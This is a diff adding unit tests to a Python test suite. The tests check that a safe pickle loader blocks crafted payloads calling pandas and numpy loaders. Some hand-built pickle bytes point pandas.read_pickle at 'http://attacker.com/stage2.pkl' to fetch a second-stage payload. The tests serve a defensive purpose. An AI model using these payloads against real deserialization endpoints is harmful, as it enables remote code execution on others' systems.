@@ -45,7 +45,7 @@ from CommonServerPython import (xml2json, json2xml, entryTypes, formats, tableTo
                                 censor_request_logs, safe_sleep, get_server_config, b64_decode,
                                 get_engine_base_url, is_integration_instance_running_on_engine, find_and_remove_sensitive_text, stringEscapeMD,
                                 execute_polling_command, QuickActionPreview, MirrorObject, get_pack_version, ExecutionTimeout, is_ip_address_internal,
-                                safe_pickle_loads, UnsafePickleError
+                                safe_pickle_loads, UnsafePickleError, _PICKLE_FUNCTION_ALLOWLIST
                                 )
 
 
@@ -16106,6 +16106,89 @@ class TestSafePickleLoads:
         payload = _pickle.dumps(OrderedDict([("a", 1), ("b", 2)]))
         result = safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
         assert result == OrderedDict([("a", 1), ("b", 2)])
+
+    def test_blocks_pandas_read_pickle_bypass(self, monkeypatch):
+        """Verify that pd.read_pickle is blocked by Gate 3 even when pandas is in safe_module_prefixes."""
+        import pickle as _pickle
+        import types
+
+        # Create dummy module and function so test runs in Docker environments without pandas installed
+        fake_pandas = types.ModuleType("pandas")
+        fake_pandas.read_pickle = lambda *args, **kwargs: None  # type: ignore[attr-defined]
+        monkeypatch.setitem(sys.modules, "pandas", fake_pandas)
+
+        allowed_classes = {("builtins", "dict")}
+        safe_module_prefixes = {"pandas", "numpy", "sklearn", "scipy"}
+
+        # Stage 1 payload calling pandas.read_pickle
+        url = "http://attacker.com/stage2.pkl"
+        payload = (
+            b"\x80\x04\x8c\x06pandas\x8c\x0bread_pickle\x93"
+            + b"\x8c" + bytes([len(url)]) + url.encode("utf-8")
+            + b"\x85R."
+        )
+        with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
+            safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
+
+    def test_blocks_submodule_read_pickle_bypass(self, monkeypatch):
+        """Verify that hand-crafted pandas.io.pickle.read_pickle is also blocked by Gate 3."""
+        import pickle as _pickle
+        import types
+
+        fake_pandas = types.ModuleType("pandas")
+        fake_pandas_io = types.ModuleType("pandas.io")
+        fake_pandas_io_pickle = types.ModuleType("pandas.io.pickle")
+        fake_pandas_io_pickle.read_pickle = lambda *args, **kwargs: None  # type: ignore[attr-defined]
+        monkeypatch.setitem(sys.modules, "pandas", fake_pandas)
+        monkeypatch.setitem(sys.modules, "pandas.io", fake_pandas_io)
+        monkeypatch.setitem(sys.modules, "pandas.io.pickle", fake_pandas_io_pickle)
+
+        allowed_classes = {("builtins", "dict")}
+        safe_module_prefixes = {"pandas", "numpy", "sklearn", "scipy"}
+
+        url = "http://attacker.com/stage2.pkl"
+        payload = (
+            b"\x80\x04\x8c\x10pandas.io.pickle\x8c\x0bread_pickle\x93"
+            + b"\x8c" + bytes([len(url)]) + url.encode("utf-8")
+            + b"\x85R."
+        )
+        with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
+            safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
+
+    def test_blocks_numpy_load_bypass(self, monkeypatch):
+        """Verify that np.load is blocked by Gate 3 even when numpy is in safe_module_prefixes."""
+        import pickle as _pickle
+        import types
+
+        fake_numpy = types.ModuleType("numpy")
+        fake_numpy.load = lambda *args, **kwargs: None  # type: ignore[attr-defined]
+        monkeypatch.setitem(sys.modules, "numpy", fake_numpy)
+
+        allowed_classes = {("builtins", "dict")}
+        safe_module_prefixes = {"numpy"}
+
+        path = "/tmp/stage2.pkl"
+        payload = (
+            b"\x80\x04\x8c\x05numpy\x8c\x04load\x93"
+            + b"\x8c" + bytes([len(path)]) + path.encode("utf-8")
+            + b"\x85R."
+        )
+        with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
+            safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
+
+    def test_allows_function_in_pickle_function_allowlist(self):
+        """Verify that functions in _PICKLE_FUNCTION_ALLOWLIST are allowed through Gate 3."""
+        import pickle as _pickle
+        allowed_classes = {("builtins", "dict")}
+        safe_module_prefixes = {"_codecs"}
+
+        # ("_codecs", "encode") is in _PICKLE_FUNCTION_ALLOWLIST and top_module "_codecs" in safe_module_prefixes
+        payload = (
+            b"\x80\x04\x8c\x07_codecs\x8c\x06encode\x93"
+            b"\x8c\x04test\x85R."
+        )
+        result = safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
+        assert result == b"test"
 
 
 class TestValidatePickleOpcodes:
